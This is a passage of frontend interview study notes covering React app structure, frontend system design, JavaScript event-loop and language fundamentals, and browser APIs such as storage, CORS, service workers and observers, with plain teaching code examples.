│   ├── router.tsx          # Route definitions
│   └── App.tsx
│
├── features/               # Feature-based modules (recommended)
│   ├── auth/
│   │   ├── components/     # UI components for this feature
│   │   ├── hooks/          # Custom hooks
│   │   ├── api.ts          # API calls
│   │   ├── slice.ts        # Redux slice or Zustand store
│   │   └── types.ts        # TypeScript types
│   ├── dashboard/
│   └── users/
│
├── shared/                 # Shared across features
│   ├── components/         # Button, Input, Modal, etc.
│   ├── hooks/              # useDebounce, useFetch, etc.
│   ├── utils/              # formatDate, parseQuery, etc.
│   └── types/              # Global TS types
│
├── pages/                  # Route-level page components
└── styles/                 # Global styles, design tokens
```

**Why feature-based over type-based?**
- `features/users/` has everything for users in one place
- vs scattered `components/UserCard`, `hooks/useUsers`, `api/users` — harder to navigate

---

## 3. Component Architecture Design

```
Page (route-level, data fetching)
  └── Container/Smart Component (handles state, passes data down)
        └── Presentational/Dumb Component (stateless, just renders props)
              └── Atomic Components (Button, Input, Icon)
```

**Rules:**
- Push state up only as far as needed (co-locate state)
- Presentational components are easy to test and reuse
- Smart components handle data fetching, side effects
- Use compound components for complex UI (Tabs, Accordion, Select)

---

## 4. Design a News Feed (like Twitter/Facebook)

**Requirements:** Real-time feed, infinite scroll, post creation, likes/comments.

**Architecture decisions:**

```
State management:
  - Feed posts → React Query (server state, caching)
  - UI state (modal open, active tab) → useState
  - Auth user → Context or Redux

Data fetching:
  - Initial load: SSR for SEO (getServerSideProps)
  - Infinite scroll: React Query with cursor-based pagination
  - Real-time new posts: WebSocket or SSE

Performance:
  - Virtualize the feed (react-window) — don't render 1000 posts
  - Optimistic updates for likes/comments
  - Debounce post content autosave

Component structure:
  FeedPage
    ├── CreatePostBox
    ├── FeedList (virtualized)
    │     └── PostCard
    │           ├── PostHeader (avatar, name, time)
    │           ├── PostContent (text, images)
    │           └── PostActions (like, comment, share)
    └── NewPostsNotification ("5 new posts" banner)
```

---

## 5. Design an E-Commerce Product Page

```
Performance priorities:
  - LCP (Largest Contentful Paint): product image must load fast
    → Preload hero image, next/image with priority, WebP format
  - CLS (Cumulative Layout Shift): reserve space for images
    → Always set width/height on images
  - TTI (Time to Interactive): JS bundle size
    → Code split: lazy load reviews, recommendations

Caching strategy:
  - Product data → ISR (revalidate every 5 min)
  - Inventory/price → SSR (always fresh — can't cache stock levels)
  - Reviews → SSG + pagination

State:
  - Selected variant (size, color) → useState (local)
  - Cart → Zustand or Redux (global, persisted to localStorage)
  - Wishlist → Zustand + synced to backend

Component tree:
  ProductPage
    ├── ImageGallery (lazy load non-hero images)
    ├── ProductInfo
    │     ├── VariantSelector
    │     └── AddToCartButton (optimistic UI)
    ├── Tabs (lazy loaded)
    │     ├── Description
    │     ├── Specifications
    │     └── Reviews (infinite scroll)
    └── RecommendedProducts (lazy loaded, below fold)
```

---

## 6. Micro-Frontends

Split a large application into **independently deployable frontend modules**, each owned by a different team.

```
Shell App (orchestrator)
  ├── /checkout  → Checkout Team's app
  ├── /profile   → Profile Team's app
  └── /catalog   → Catalog Team's app
```

**Implementation approaches:**
- **Module Federation** (Webpack 5) — load remote JS modules at runtime
- **iframes** — complete isolation, but UX limitations
- **Web Components** — framework-agnostic, native browser support

**Trade-offs:**
- ✅ Independent deployments, team autonomy, technology diversity
- ❌ Bundle duplication, shared state complexity, consistent UX harder

---

## 7. Monorepo Structure (Nx / Turborepo)

```
monorepo/
├── apps/
│   ├── web/           # Main React app
│   ├── admin/         # Admin dashboard
│   └── mobile/        # React Native
├── packages/
│   ├── ui/            # Shared component library
│   ├── utils/         # Shared utilities
│   ├── api-client/    # Shared API types/client
│   └── config/        # Shared ESLint, TS config
└── package.json
```

**Benefits:** Share code between apps, single lint/test/build pipeline, atomic commits across apps.

---

## 8. Performance Budget & Core Web Vitals

**Core Web Vitals (Google ranking factors):**

| Metric | What it measures | Good | Poor |
|---|---|---|---|
| LCP (Largest Contentful Paint) | Loading performance | < 2.5s | > 4s |
| FID/INP (Interaction to Next Paint) | Interactivity | < 200ms | > 500ms |
| CLS (Cumulative Layout Shift) | Visual stability | < 0.1 | > 0.25 |

**Optimization strategies:**

```
LCP:
  - Preload hero images: <link rel="preload" as="image" href="hero.webp">
  - Use CDN for static assets
  - SSR/SSG for faster initial HTML
  - Reduce server response time (TTFB)

CLS:
  - Always set width and height on images/videos
  - Don't inject content above existing content
  - Use skeleton loaders that match content size
  - Font-display: swap with fallback font size matching

INP/FID:
  - Break up long tasks (> 50ms) with scheduler.yield() or setTimeout
  - Use Web Workers for heavy computation
  - Virtualize long lists
  - useTransition for non-urgent updates
```

---

## 9. CDN & Caching Strategy

```
User → CDN Edge (cache hit) → fast response
User → CDN Edge (cache miss) → Origin Server → CDN stores → response

Cache-Control headers:
  Cache-Control: public, max-age=31536000, immutable
    ↑ For hashed assets (app.abc123.js) — cache forever, never changes
  
  Cache-Control: no-cache
    ↑ Browser revalidates every time (but can use cached if ETag matches)
  
  Cache-Control: no-store
    ↑ Never cache (sensitive data)
  
  Cache-Control: max-age=60, stale-while-revalidate=300
    ↑ Fresh for 60s, serve stale for 300s while revalidating in background
```

---

## 10. Design System Architecture

```
Design Tokens (source of truth: colors, spacing, typography)
  ↓
Primitive/Atomic Components (Button, Input, Badge, Icon)
  ↓
Composite Components (Form, Card, Modal, DataTable)
  ↓
Page Templates (DashboardLayout, AuthLayout)
  ↓
Pages
```

```js
// Design tokens as CSS variables
:root {
  --color-primary-500: #3B82F6;
  --color-primary-600: #2563EB;
  --spacing-4: 1rem;
  --radius-md: 0.375rem;
  --font-size-base: 1rem;
  --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1);
}

// Component uses tokens, not hard-coded values
.button {
  background: var(--color-primary-500);
  padding: var(--spacing-2) var(--spacing-4);
  border-radius: var(--radius-md);
}
```

---

## 11. Testing Strategy (Testing Pyramid)

```
         /\
        /E2E\       ← Few, slow, expensive (Cypress, Playwright)
       /------\
      / Integr \    ← Some (React Testing Library)
     /----------\
    /    Unit    \  ← Many, fast, cheap (Jest, Vitest)
   /--------------\
```

```js
// Unit test — isolated function
test('formatCurrency formats numbers correctly', () => {
  expect(formatCurrency(1000)).toBe('$1,000.00');
  expect(formatCurrency(-50)).toBe('-$50.00');
});

// Integration test — component with interactions
test('login form submits correctly', async () => {
  render(<LoginForm onLogin={mockLogin} />);
  await userEvent.type(screen.getByLabelText('Email'), 'alice@example.com');
  await userEvent.type(screen.getByLabelText('Password'), 'password123');
  await userEvent.click(screen.getByRole('button', { name: 'Login' }));
  expect(mockLogin).toHaveBeenCalledWith({ email: 'alice@example.com', password: 'password123' });
});

// E2E test — full user flow
test('user can log in and see dashboard', async ({ page }) => {
  await page.goto('/login');
  await page.fill('[name=email]', 'alice@example.com');
  await page.fill('[name=password]', 'password123');
  await page.click('button[type=submit]');
  await expect(page).toHaveURL('/dashboard');
  await expect(page.locator('h1')).toContainText('Welcome, Alice');
});
```

---

## 12. Interview Quick-Reference: Key Trade-offs

| Decision | Option A | Option B | Choose A when | Choose B when |
|---|---|---|---|---|
| Rendering | CSR | SSR/SSG | Auth dashboard | SEO-critical pages |
| State | Context | Redux | Small app | Complex/large app |
| Data fetching | useEffect | React Query | Simple, one-off | Caching, sync needed |
| Routing | React Router | Next.js | SPA | SEO + server features |
| Styling | CSS Modules | Tailwind | Complex custom styles | Rapid UI development |
| Auth tokens | localStorage | httpOnly cookie | Simplicity | Security |

---

*Good luck! Remember: interviewers want to see your **reasoning and trade-off thinking**, not just the right answer.*# Frontend Interview Notes — Advanced Topics

> Covers: JavaScript Fundamentals · Browser APIs · Security · System Design

---

## Table of Contents

1. [JavaScript Fundamentals](#section-1-javascript-fundamentals)
2. [Browser & Web APIs](#section-2-browser--web-apis)
3. [Security](#section-3-security)
4. [System Design for Frontend](#section-4-system-design-for-frontend)

---

# Section 1: JavaScript Fundamentals

---

## 1. The Event Loop (Detailed)

This is the **most important JS concept for interviews**. Understand it deeply.

### The Big Picture

JavaScript is **single-threaded** — it can only do one thing at a time. But it can handle async operations (timers, fetch, events) without blocking. The **Event Loop** is the mechanism that makes this possible.

### The Key Players

```
┌─────────────────────────────────┐
│         Call Stack              │  ← Where code executes (LIFO)
│  [ main() ]                     │
│  [ console.log() ]              │
└─────────────────────────────────┘
         ↓ when stack is empty
┌─────────────────────────────────┐
│       Microtask Queue           │  ← Promises, queueMicrotask (HIGH PRIORITY)
│  [ .then() ][ async/await ]     │
└─────────────────────────────────┘
         ↓ when microtask queue is empty
┌─────────────────────────────────┐
│       Macrotask Queue           │  ← setTimeout, setInterval, I/O (LOWER PRIORITY)
│  [ setTimeout() ][ setInterval ]│
└─────────────────────────────────┘
         ↑
    Event Loop watches: "Is the Call Stack empty?
                         Then pick next task."
```

### How it Works — Step by Step

1. JS runs synchronous code line by line, pushing functions onto the **Call Stack**
2. When an async operation completes (timer fires, fetch resolves), its callback goes into a **queue**
3. The **Event Loop** constantly checks: *"Is the Call Stack empty?"*
4. If yes → it picks the next task from the queue and pushes it onto the Call Stack
5. **Microtasks** (Promises) are always processed **before** Macrotasks (setTimeout)

---

### Easy Example 1 — Basic Order

```js
console.log('1 - Start');             // synchronous

setTimeout(() => {
  console.log('2 - setTimeout');      // macrotask queue
}, 0);

Promise.resolve().then(() => {
  console.log('3 - Promise');         // microtask queue
});

console.log('4 - End');               // synchronous

// OUTPUT:
// 1 - Start
// 4 - End
// 3 - Promise      ← microtask runs BEFORE setTimeout
// 2 - setTimeout   ← macrotask runs last
```

**Why?**
- Lines 1 and 4 are synchronous → run immediately on Call Stack
- `setTimeout` callback → goes to Macrotask Queue
- `Promise.then` callback → goes to Microtask Queue
- Call Stack is now empty → Event Loop checks Microtask Queue first → runs Promise
- Then checks Macrotask Queue → runs setTimeout

---

### Easy Example 2 — Visualizing the Queues

```js
console.log('A');

setTimeout(() => console.log('B'), 0);
setTimeout(() => console.log('C'), 0);

Promise.resolve().then(() => console.log('D'));
Promise.resolve().then(() => console.log('E'));

console.log('F');

// OUTPUT: A → F → D → E → B → C
```

**Walkthrough:**
```
Call Stack runs:  A, F  (synchronous)
Microtask Queue:  [D, E]
Macrotask Queue:  [B, C]

Event Loop: Stack empty → drain microtasks → D, E
Event Loop: Stack empty → pick next macrotask → B
Event Loop: Stack empty → pick next macrotask → C
```

---

### Easy Example 3 — async/await is just Promises

```js
async function main() {
  console.log('1');

  await Promise.resolve();       // pauses here, schedules rest as microtask

  console.log('2');              // runs after microtask queue pick-up
}

main();
console.log('3');

// OUTPUT: 1 → 3 → 2
```

**Why?** `await` suspends the async function and puts the rest of it into the **microtask queue**. Meanwhile, synchronous code (`console.log('3')`) continues.

---

### Easy Example 4 — Nested Microtasks

```js
Promise.resolve()
  .then(() => {
    console.log('A');
    return Promise.resolve();   // adds another microtask
  })
  .then(() => console.log('B'));

Promise.resolve().then(() => console.log('C'));

// OUTPUT: A → C → B
```

**Why?** After `A` runs, `B` is scheduled as a *new* microtask at the end of the queue. `C` was already in the queue before `B`, so `C` runs first.

---

### Summary Table

| Task Type | Examples | Priority | Queue |
|---|---|---|---|
| Synchronous | Regular code, function calls | Immediate | Call Stack |
| Microtask | `Promise.then`, `async/await`, `queueMicrotask` | High | Microtask Queue |
| Macrotask | `setTimeout`, `setInterval`, `fetch` callbacks, DOM events | Normal | Macrotask Queue |

> **Interview answer:** "The event loop continuously checks if the call stack is empty. When it is, it first drains all microtasks (Promises), then picks one macrotask (setTimeout), then drains microtasks again, and so on."

---

## 2. Closures

A closure is when a function **remembers the variables from its outer scope** even after the outer function has finished executing.

```js
function makeCounter() {
  let count = 0;          // this variable is "closed over"

  return function() {
    count++;
    return count;
  };
}

const counter = makeCounter(); // makeCounter() is done, but count lives on
console.log(counter()); // 1
console.log(counter()); // 2
console.log(counter()); // 3
```

**Practical uses:**
- Data privacy / encapsulation
- Factory functions
- Memoization
- Event handlers that remember context

```js
// Classic interview bug — var in loops
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // prints 3, 3, 3 ❌
}

// Fix with let (block scope)
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100); // prints 0, 1, 2 ✅
}

// Fix with closure (IIFE)
for (var i = 0; i < 3; i++) {
  ((j) => setTimeout(() => console.log(j), 100))(i); // 0, 1, 2 ✅
}
```

---

## 3. Scope & Hoisting

### Scope Types

```js
// Global scope
var globalVar = 'I am global';

function outer() {
  // Function scope
  var funcVar = 'I am in outer';

  if (true) {
    // Block scope (let/const only)
    let blockVar = 'I am in block';
    const blockConst = 'also block';
    var notBlock = 'I leak to function scope!'; // var ignores blocks
  }

  console.log(notBlock);   // ✅ accessible — var leaks
  // console.log(blockVar); // ❌ ReferenceError
}
```

### Hoisting

Variables and function declarations are **moved to the top of their scope** at compile time.

```js
// What you write:
console.log(x);  // undefined (not ReferenceError)
var x = 5;
sayHi();         // works!
function sayHi() { console.log('Hi'); }

// What JS actually executes:
var x;           // declaration hoisted, initialized to undefined
function sayHi() { console.log('Hi'); }  // fully hoisted
console.log(x);  // undefined
x = 5;
sayHi();

// let/const are hoisted but NOT initialized (Temporal Dead Zone)
console.log(y);  // ❌ ReferenceError: Cannot access 'y' before initialization
let y = 10;
```

---

## 4. var vs let vs const

| | `var` | `let` | `const` |
|---|---|---|---|
| Scope | Function | Block | Block |
| Hoisted | Yes (undefined) | Yes (TDZ) | Yes (TDZ) |
| Re-declare | Yes | No | No |
| Re-assign | Yes | Yes | No |
| Global property | Yes (`window.x`) | No | No |

```js
const obj = { name: 'John' };
obj.name = 'Jane';    // ✅ Mutating properties is fine
obj = {};             // ❌ Re-assigning the reference is not

const arr = [1, 2, 3];
arr.push(4);          // ✅ Fine
arr = [5];            // ❌ Not fine
```

---

## 5. `this` Keyword

`this` refers to the **execution context** — it depends on *how* a function is called.

```js
// 1. Global context
console.log(this); // window (browser) or global (Node)

// 2. Object method — this = the object
const user = {
  name: 'Alice',
  greet() { console.log(this.name); } // 'Alice'
};
user.greet();

// 3. Regular function — this = undefined (strict) or global
function show() { console.log(this); }
show(); // window or undefined in strict mode

// 4. Arrow function — this = inherited from enclosing scope
const obj = {
  name: 'Bob',
  greet: () => console.log(this.name), // 'this' is outer scope, NOT obj
  greetCorrect() {
    const inner = () => console.log(this.name); // ✅ inherits obj's this
    inner();
  }
};

// 5. Constructor — this = new object being created
function Person(name) {
  this.name = name;
}
const p = new Person('Charlie'); // this = {}

// 6. Explicit binding
function greet() { console.log(this.name); }
greet.call({ name: 'Dave' });         // Dave
greet.apply({ name: 'Eve' });         // Eve
const bound = greet.bind({ name: 'Frank' });
bound();                               // Frank
```

---

## 6. Prototypal Inheritance

Every object in JS has a `[[Prototype]]` (hidden link to another object). When you access a property, JS walks up the **prototype chain** until it finds it or hits `null`.

```js
const animal = {
  eat() { console.log('eating'); }
};

const dog = Object.create(animal); // dog's prototype = animal
dog.bark = function() { console.log('woof'); };

dog.bark(); // 'woof'     — own property
dog.eat();  // 'eating'   — found on prototype chain

// Class syntax (syntactic sugar over prototypes)
class Animal {
  constructor(name) { this.name = name; }
  eat() { console.log(`${this.name} is eating`); }
}

class Dog extends Animal {
  bark() { console.log('woof'); }
}

const d = new Dog('Rex');
d.eat();  // works via prototype chain
d.bark(); // own method
```

---

## 7. Promises & Async/Await

### Promises

```js
const fetchUser = (id) => new Promise((resolve, reject) => {
  setTimeout(() => {
    if (id > 0) resolve({ id, name: 'Alice' });
    else reject(new Error('Invalid ID'));
  }, 1000);
});

// Chaining
fetchUser(1)
  .then(user => user.name)
  .then(name => console.log(name))
  .catch(err => console.error(err))
  .finally(() => console.log('Done'));
```

### Promise Methods

```js
// Promise.all — all must resolve, fails fast
const [user, posts] = await Promise.all([fetchUser(1), fetchPosts(1)]);

// Promise.allSettled — wait for all, even if some fail
const results = await Promise.allSettled([p1, p2, p3]);
// results = [{ status: 'fulfilled', value: ... }, { status: 'rejected', reason: ... }]

// Promise.race — first to resolve/reject wins
const first = await Promise.race([fast, slow]);

// Promise.any — first to RESOLVE wins (ignores rejections)
const fastest = await Promise.any([p1, p2, p3]);
```

### Async/Await

```js
async function loadData() {
  try {
    const response = await fetch('/api/data');
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed:', error);
    throw error; // re-throw if needed
  }
}

// Parallel fetches — don't await sequentially
// ❌ Sequential (slow — 2 seconds total)
const user = await fetchUser();
const posts = await fetchPosts();

// ✅ Parallel (fast — 1 second total)
const [user, posts] = await Promise.all([fetchUser(), fetchPosts()]);
```

---

## 8. Array Methods

```js
const numbers = [1, 2, 3, 4, 5];
const users = [
  { id: 1, name: 'Alice', age: 25, active: true },
  { id: 2, name: 'Bob',   age: 17, active: false },
  { id: 3, name: 'Carol', age: 30, active: true },
];

// map — transform each element, returns new array
const doubled = numbers.map(n => n * 2);          // [2,4,6,8,10]
const names = users.map(u => u.name);             // ['Alice','Bob','Carol']

// filter — keep elements that pass the test
const adults = users.filter(u => u.age >= 18);   // Alice, Carol
const evens = numbers.filter(n => n % 2 === 0);  // [2, 4]

// reduce — accumulate into a single value
const sum = numbers.reduce((acc, n) => acc + n, 0); // 15
const nameMap = users.reduce((acc, u) => {
  acc[u.id] = u.name;
  return acc;
}, {}); // { 1: 'Alice', 2: 'Bob', 3: 'Carol' }

// find — first match (returns element or undefined)
const bob = users.find(u => u.name === 'Bob');

// findIndex — first match index
const idx = users.findIndex(u => u.id === 2); // 1

// some — at least one passes
const hasMinors = users.some(u => u.age < 18); // true

// every — all pass
const allActive = users.every(u => u.active); // false

// flat / flatMap
const nested = [[1, 2], [3, 4]];
nested.flat();                          // [1,2,3,4]
nested.flatMap(arr => arr.map(n => n * 2)); // [2,4,6,8]

// sort (mutates!) — always provide comparator for numbers
const sorted = [...numbers].sort((a, b) => b - a); // [5,4,3,2,1]
const byAge = [...users].sort((a, b) => a.age - b.age);
```

---

## 9. Destructuring & Spread/Rest

```js
// Array destructuring
const [first, second, ...rest] = [1, 2, 3, 4, 5];
// first=1, second=2, rest=[3,4,5]

// Object destructuring
const { name, age, city = 'Unknown' } = user; // city has default
const { name: userName } = user;              // rename to userName

// Nested destructuring
const { address: { street } } = { address: { street: '123 Main St' } };

// Spread
const arr1 = [1, 2, 3];
const arr2 = [...arr1, 4, 5];         // [1,2,3,4,5]
const obj1 = { a: 1 };
const obj2 = { ...obj1, b: 2 };       // { a:1, b:2 }

// Rest in functions
function sum(...numbers) {            // rest — collects all args
  return numbers.reduce((a, b) => a + b, 0);
}
sum(1, 2, 3, 4); // 10
```

---

## 10. Shallow vs Deep Copy

```js
const original = { name: 'Alice', address: { city: 'NYC' } };

// Shallow copy — nested objects are still shared references
const shallow = { ...original };
const shallow2 = Object.assign({}, original);

shallow.address.city = 'LA';
console.log(original.address.city); // 'LA' — MUTATED! ❌

// Deep copy options
// 1. JSON (simple, but loses functions, Date, undefined, circular refs)
const deep1 = JSON.parse(JSON.stringify(original));

// 2. structuredClone (modern, recommended)
const deep2 = structuredClone(original);

deep2.address.city = 'Chicago';
console.log(original.address.city); // 'NYC' — safe ✅
```

---

## 11. Optional Chaining & Nullish Coalescing

```js
const user = { profile: { name: 'Alice' } };

// Optional chaining (?.) — short-circuits to undefined instead of throwing
const city = user?.address?.city;          // undefined (no error)
const len = user?.friends?.length;         // undefined
const first = user?.friends?.[0];          // undefined
const result = user?.getAge?.();           // undefined (safe method call)

// Nullish coalescing (??) — fallback for null/undefined only
const name = user?.name ?? 'Anonymous';    // 'Alice'
const count = 0 ?? 'default';              // 0 (not 'default'! 0 is not null/undefined)
const count2 = 0 || 'default';             // 'default' (|| treats 0 as falsy)
```

---

## 12. WeakMap, WeakSet, WeakRef

These hold **weak references** — they don't prevent garbage collection.

```js
// WeakMap — keys must be objects, not enumerable
const cache = new WeakMap();

function processUser(user) {
  if (cache.has(user)) return cache.get(user);
  const result = expensiveComputation(user);
  cache.set(user, result);
  return result;
}
// When `user` object is garbage collected, cache entry is automatically removed

// WeakSet — stores objects, auto-removes when object is GC'd
const seen = new WeakSet();
function processOnce(obj) {
  if (seen.has(obj)) return;
  seen.add(obj);
  process(obj);
}
```

**Use case:** Caching data associated with objects without preventing GC. Useful for DOM nodes.

---

## 13. Generators & Iterators

```js
// Generator — a function that can pause and resume
function* counter(start = 0) {
  while (true) {
    yield start++;   // pause here, return value
  }
}

const gen = counter(1);
console.log(gen.next().value); // 1
console.log(gen.next().value); // 2
console.log(gen.next().value); // 3

// Finite generator
function* range(start, end) {
  for (let i = start; i <= end; i++) {
    yield i;
  }
}

for (const num of range(1, 5)) {
  console.log(num); // 1, 2, 3, 4, 5
}

// Practical: lazy data pagination
function* paginate(data, pageSize) {
  for (let i = 0; i < data.length; i += pageSize) {
    yield data.slice(i, i + pageSize);
  }
}
```

---

## 14. ES Modules vs CommonJS

| | ES Modules | CommonJS |
|---|---|---|
| Syntax | `import/export` | `require/module.exports` |
| Loading | Static (compile time) | Dynamic (runtime) |
| Tree-shaking | ✅ Yes | ❌ No |
| Browser native | ✅ Yes | ❌ No (needs bundler) |
| Default in | Modern JS, React, Vite | Node.js (legacy) |

```js
// ES Modules
export const PI = 3.14;
export default function main() {}
import { PI } from './math.js';
import main from './main.js';
import * as utils from './utils.js';

// CommonJS (Node.js)
module.exports = { PI: 3.14 };
const { PI } = require('./math.js');
```

---

## 15. Currying & Function Composition

```js
// Currying — transforms f(a, b, c) into f(a)(b)(c)
const add = (a) => (b) => a + b;
const add5 = add(5);
add5(3); // 8
add5(10); // 15

// Practical currying
const multiply = a => b => a * b;
const double = multiply(2);
const triple = multiply(3);
[1,2,3].map(double); // [2,4,6]

// Function composition
const compose = (...fns) => x => fns.reduceRight((acc, fn) => fn(acc), x);
const pipe = (...fns) => x => fns.reduce((acc, fn) => fn(acc), x);

const process = pipe(
  x => x * 2,
  x => x + 1,
  x => `Result: ${x}`
);
process(5); // "Result: 11"
```

---

## 16. Memoization

```js
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const slowFib = n => n <= 1 ? n : slowFib(n-1) + slowFib(n-2);
const fastFib = memoize(slowFib);
fastFib(40); // instant after first call
```

---

# Section 2: Browser & Web APIs

---

## 1. How Browsers Render Pages (Critical Rendering Path)

```
HTML → DOM
CSS  → CSSOM
         ↓
    DOM + CSSOM → Render Tree
                      ↓
                   Layout (calculate positions/sizes)
                      ↓
                   Paint (fill pixels)
                      ↓
                   Composite (layer merging, GPU)
```

**Key concepts:**
- **Render-blocking resources:** CSS blocks rendering. JS blocks HTML parsing (use `defer`/`async`)
- **Reflow (Layout):** Expensive — triggered by changing size, position, or content of elements
- **Repaint:** Less expensive — triggered by changing color, visibility (without layout change)
- **Composite:** Cheapest — CSS transforms, opacity (GPU-accelerated)

```html
<!-- async — downloads in parallel, executes immediately when ready -->
<script async src="analytics.js"></script>

<!-- defer — downloads in parallel, executes AFTER HTML parsing -->
<script defer src="app.js"></script>
```

**Performance tip:** Prefer CSS `transform` and `opacity` for animations — they skip Layout and Paint.

---

## 2. DOM Manipulation

```js
// Selecting elements
const el = document.getElementById('my-id');
const el2 = document.querySelector('.my-class');    // first match
const els = document.querySelectorAll('div.card');  // all matches (NodeList)

// Creating & modifying
const div = document.createElement('div');
div.textContent = 'Hello';                          // safe (no XSS)
div.innerHTML = '<strong>Hello</strong>';           // ⚠️ XSS risk with user data
div.classList.add('active');
div.classList.toggle('hidden');
div.setAttribute('data-id', '123');

// Inserting
document.body.appendChild(div);
parent.insertBefore(div, referenceNode);
parent.insertAdjacentHTML('beforeend', '<p>New</p>'); // fastest for HTML strings

// Removing
el.remove();
parent.removeChild(el);
```

---

## 3. Event Delegation

Instead of attaching listeners to every child, attach **one listener to the parent**. Uses event bubbling.

```js
// ❌ Inefficient — 1000 listeners
document.querySelectorAll('.item').forEach(item => {
  item.addEventListener('click', handleClick);
});

// ✅ Efficient — 1 listener
document.querySelector('#list').addEventListener('click', (e) => {
  if (e.target.matches('.item')) {
    handleClick(e.target);
  }
  if (e.target.closest('.delete-btn')) {
    deleteItem(e.target.closest('.item'));
  }
});
```

**Benefits:** Works for dynamically added elements. Better memory usage.

---

## 4. Event Bubbling & Capturing

```
                    Document
                       |
        Capturing ↓    |    ↑ Bubbling
                    Parent
                       |
                     Child  ← click happens here
```

```js
// Bubbling (default) — event travels UP from target to root
child.addEventListener('click', handler);          // 3rd arg default = false = bubble

// Capturing — event travels DOWN from root to target
parent.addEventListener('click', handler, true);   // capture phase

// Stop propagation
element.addEventListener('click', (e) => {
  e.stopPropagation();   // stop bubbling/capturing
  e.preventDefault();    // prevent default browser action (form submit, link)
});
```

---

## 5. Storage APIs

| | localStorage | sessionStorage | Cookies | IndexedDB |
|---|---|---|---|---|
| Capacity | ~5MB | ~5MB | ~4KB | Hundreds of MB |
| Expires | Never | Tab close | Set expiry | Never |
| Sent with requests | No | No | Yes | No |
| Accessible from JS | Yes | Yes | Yes | Yes |
| Use case | User prefs, theme | Tab-specific state | Auth tokens (httpOnly) | Large structured data |

```js
// localStorage — persists forever
localStorage.setItem('theme', 'dark');
const theme = localStorage.getItem('theme');
localStorage.removeItem('theme');
localStorage.clear();

// Always parse JSON
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// sessionStorage — same API, clears on tab close
sessionStorage.setItem('draft', text);

// Cookies
document.cookie = 'name=Alice; path=/; max-age=3600; Secure; SameSite=Strict';
```

---

## 6. fetch API

```js
// GET
const res = await fetch('/api/users');
if (!res.ok) throw new Error(`HTTP error: ${res.status}`);
const users = await res.json();

// POST
const res = await fetch('/api/users', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Alice' }),
});

// With timeout using AbortController
const controller = new AbortController();
const timeout = setTimeout(() => controller.abort(), 5000);

try {
  const res = await fetch('/api/data', { signal: controller.signal });
  const data = await res.json();
} catch (err) {
  if (err.name === 'AbortError') console.log('Request timed out');
} finally {
  clearTimeout(timeout);
}
```

---

## 7. CORS — Cross-Origin Resource Sharing

**Problem:** Browser blocks requests to a different origin (domain/port/protocol) by default.

**Origin = Protocol + Domain + Port**
`https://myapp.com:443` ≠ `http://myapp.com` (different protocol)
`https://myapp.com` ≠ `https://api.myapp.com` (different subdomain)

```
Browser → fetch('https://api.other.com/data')
Browser adds header:  Origin: https://myapp.com

Server must respond:  Access-Control-Allow-Origin: https://myapp.com
                   or Access-Control-Allow-Origin: *

If header missing → Browser BLOCKS the response (request was sent, response blocked)
```

**Fix on server (Node/Express):**
```js
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://myapp.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
```

**Preflight requests:** For non-simple requests (PUT, DELETE, custom headers), browser sends an `OPTIONS` request first to check if the server allows it.

---

## 8. Service Workers & PWA

A **Service Worker** is a script that runs in the background (separate thread), intercepting network requests. Powers offline functionality, push notifications, and background sync.

```js
// Register service worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

// sw.js — Cache on install
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open('v1').then(cache =>
      cache.addAll(['/index.html', '/styles.css', '/app.js'])
    )
  );
});

// Intercept fetch — serve from cache, fallback to network
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request).then(cached =>
      cached || fetch(event.request)
    )
  );
});
```

---

## 9. Web Workers

Run CPU-heavy JavaScript on a **background thread** to avoid blocking the UI thread.

```js
// main.js
const worker = new Worker('worker.js');

worker.postMessage({ data: largeArray });      // send data to worker

worker.onmessage = (e) => {
  console.log('Result:', e.data);              // receive result
};

// worker.js (separate file, no DOM access)
self.onmessage = (e) => {
  const result = heavyComputation(e.data.data);
  self.postMessage(result);                    // send back result
};
```

**Use case:** Image processing, sorting huge arrays, cryptography — anything that would freeze the UI.

---

## 10. WebSockets vs SSE vs Long Polling

| | WebSocket | Server-Sent Events (SSE) | Long Polling |
|---|---|---|---|
| Direction | Bi-directional | Server → Client only | Server → Client |
| Protocol | `ws://` / `wss://` | HTTP | HTTP |
| Complexity | Medium | Low | Low |
| Use case | Chat, games, live collab | Notifications, live feed | Simple real-time |
| Auto-reconnect | Manual | Built-in | Manual |

```js
// WebSocket
const ws = new WebSocket('wss://api.example.com/ws');
ws.onopen = () => ws.send(JSON.stringify({ type: 'join', room: 'general' }));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.onclose = () => console.log('Disconnected');

// Server-Sent Events
const sse = new EventSource('/api/events');
sse.onmessage = (e) => console.log(e.data);
sse.addEventListener('notification', (e) => handleNotification(e.data));
```

---

## 11. Intersection Observer

Detect when elements enter/leave the viewport — use for lazy loading, infinite scroll, animations.

```js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.classList.add('visible');
      // For lazy loading images:
      const img = entry.target;
      img.src = img.dataset.src;    // load image only when visible
      observer.unobserve(img);      // stop watching after load
    }
  });
}, {
  threshold: 0.1,      // trigger when 10% visible
  rootMargin: '50px',  // trigger 50px before entering viewport
});

document.querySelectorAll('.lazy-img').forEach(img => observer.observe(img));
```

---

## 12. MutationObserver

Watch for changes to the DOM tree.

```js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      console.log('Children changed:', mutation.addedNodes);
    }
    if (mutation.type === 'attributes') {
      console.log('Attribute changed:', mutation.attributeName);
    }
  });
});

observer.observe(document.body, {
  childList: true,    // watch for add/remove
